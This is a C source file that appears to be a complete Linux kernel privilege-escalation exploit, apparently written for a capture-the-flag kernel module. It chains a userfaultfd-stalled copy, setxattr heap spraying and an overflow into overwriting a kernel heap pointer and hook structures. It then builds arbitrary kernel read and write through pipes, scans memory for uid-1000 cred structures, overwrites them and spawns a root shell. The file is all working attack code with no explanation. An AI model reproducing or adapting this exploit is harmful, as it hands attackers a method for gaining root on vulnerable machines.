//gcc ./exp.c -o ./exp -o -s --static -lpthread
#define AUTOR yeonnic
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <malloc.h>
#include <error.h>
#include <sched.h>
#include <pthread.h>
#include <err.h>
#include <malloc.h>
#include <poll.h>
#include <dirent.h>
#include <sys/xattr.h>

#include <linux/userfaultfd.h>

#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/poll.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>

typedef unsigned long long u64;

char *pages;
char *pages2;
char buf[0x100];
int cnt = 0;

int read_at_address_pipe(void* address, void* buf, ssize_t len)
{
    int ret = 1;
    int pipes[2];

    if(pipe(pipes) || cnt)
    return 1;

    if(write(pipes[1], address, len) != len)
        goto end;
    if(read(pipes[0], buf, len) != len)
        goto end;

    ret = 0;
end:
    close(pipes[1]);
    close(pipes[0]);
    return ret;
}

void *get_root(void *arg) {

	while(getuid() != 0)
		;


  printf("got root!!\n");
  cnt = 1;
  system("/bin/sh");



	return NULL;
}


void *thread(void *arg){

  u64 *a = (u64*)(pages+0x1000-(0x20*10));
  for (int i = 0; i < 10; i++) {
    a[i*4] = 0xffffffffc0004000;
  }
  printf("[+]overflow trig\n");
  write(1, a, 0xfffffffffffffff8);

}

void *thread2(void *arg) {

  u64 *a = (u64*)(pages+0x1000-0x1c);
  a[0] = (u64)(buf+0x18);
  a[0] = (u64)(pages2+0x18);
  a[1] = (u64)(pages2+0x18);
  a[2] = (u64)(pages2+0x18);
  setxattr("./exp", "./exp", a, 0x20, 0);
}


int main(int argc, const char *argv[])
{
  int ufd;
  struct uffdio_api api;
  struct uffdio_register reg;
  pthread_t tid;

  pthread_create(&tid, NULL, get_root, NULL);

  if ((ufd = syscall(__NR_userfaultfd, O_NONBLOCK)) == -1) {
    exit(-1);
  }
  memset(&api, 0, sizeof(api));

	api.api = UFFD_API;

	if (ioctl(ufd, UFFDIO_API, &api)) {
	}

	if (api.api != UFFD_API) {
	}

  pages = (void*)syscall(__NR_mmap, NULL, 0x10000,
          PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
  pages2 = (void*)syscall(__NR_mmap, 0x41414000, 0x10000,
          PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED| MAP_ANONYMOUS | MAP_FIXED, 0, 0);

	memset(&reg, 0, sizeof(reg));

	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	reg.range.start = (unsigned long)(pages+0x1000);
	reg.range.len = 0x1000;

	if (ioctl(ufd, UFFDIO_REGISTER, &reg)) {
	}

	if (reg.ioctls != UFFD_API_RANGE_IOCTLS) {
	}

  printf("[+]kernel heap next ptr overwrite\n");
  pthread_create(&tid, NULL, thread, NULL);
  usleep(1000);

  usleep(1000);

  int fuck = dup(1);
  stdout->_fileno = fuck;
  u64 a[10];

  memset(a, 0, sizeof(a));

  //getdents
  u64 *ptr = (u64*)pages2;
  ptr[0] = 0xffffffff812301e0;
  ptr[1] = 0xffffffffc0002170;
  ptr[2] = 0x0;
  ptr[3] = (u64)(pages2 + 0x600 + 0x18);
  ptr[4] = 0xffffffffc0004000;

  //write
  ptr = (u64*)(pages2+0x600);
  ptr[0] = 0xffffffff8121c910;
  ptr[1] = 0xffffffffc0002ce0;
  ptr[2] = 0x0;
  ptr[3] = (u64)(pages2 + 0x900 + 0x18);
  ptr[4] = 0xffffffffc0004000;

  //getdents64
  ptr = (u64*)(pages2+0x900);
  ptr[0] = 0xffffffff81734326;
  ptr[1] = 0xffffffffc0002000;
  ptr[2] = 0x0;
  ptr[3] = 0x0;
  ptr[4] = 0xffffffffc0004000;
  u64 *ptr2 = (u64*)(pages2+0x100);

  ptr2[5] = (u64)(pages2 + 0x400);

  ptr2= (u64*)(pages2 + 0x400);

  printf("[+]hook info overwrite...\n");
  ptr2[0xd] = 0xffffffffc0002D50;

  int ret = 0; 
  while(1){
    pthread_create(&tid, NULL, thread2, NULL);
    usleep(1000);
    syscall(__NR_getdents64, pages2+0x100, 0x77777777, 0x88888888);
		ret = read_at_address_pipe((void*)0xffff88000c002000, buf, 0x10);
    //printf("ret = %d\n", ret) ;
    if (!ret)
      break;

  }
  //mutex force unlock
  ptr = (u64*)(pages2+0x1000);
  ptr[0] = 1;
  read_at_address_pipe((void*)ptr, (void*)0xffffffffc0004020, 0x8);

  ptr = (u64*)(pages2+0x1000);
  ptr[0] = 0xffffffff812301e0;
  ptr[1] = 0xffffffffc0002170;
  ptr[2] = 0x0;
  ptr[3] = 0xffffffffc00044c0+ 0x18;
  ptr[4] = 0xffffffffc0004000;

  //write
  ptr = (u64*)(pages2+0x1040);
  ptr[0] = 0xffffffff8121c910;
  ptr[1] = 0xffffffffc0002ce0;
  ptr[2] = 0x0;
  ptr[3] = 0xffffffffc0004518;
  ptr[4] = 0xffffffffc0004000;

  //getdents64
  ptr = (u64*)(pages2+0x1080);
  ptr[0] = 0xffffffff812302f0;
  ptr[1] = 0xffffffffc0002000;
  ptr[2] = 0x0;
  ptr[3] = 0x0;
  read_at_address_pipe((void*)(pages2+0x1000), (void*)0xffffffffc0004480, 0x100);

  ptr[0] = 0xffffffffc0004498;
  ptr[1] = 0xffffffffc0004498;
  read_at_address_pipe((void*)ptr, (void*)0xffffffffc0004000, 0x10);
  printf("[+]hook info restore\n");

  unsigned long long kstack = 0xffff88000a000000;
	char *kk = (char*)malloc(0x1000000);
	unsigned int *p = (unsigned int*)kk;
	memset(kk, 0, 0x10000);
	memset(buf, 0, 0x100);

  printf("[+]cred overwrite start\n");
	//search cred and overwrite
	for (int j = 0; j < 0x1000&& !cnt; j++) {
		read_at_address_pipe((void*)kstack, (void*)kk, 0x10000);
		for (int i = 0; i < (0x10000/4) && !cnt; i++) {
			if (p[i] == 1000&& p[i+1] == 1000 && p[i+2] == 1000 && !cnt){
				read_at_address_pipe((void*)buf, (void*)(kstack+i*4), 0x10);
			}
		}
		kstack += 0x10000;
	}

  sleep(1000);

  return 0;
}

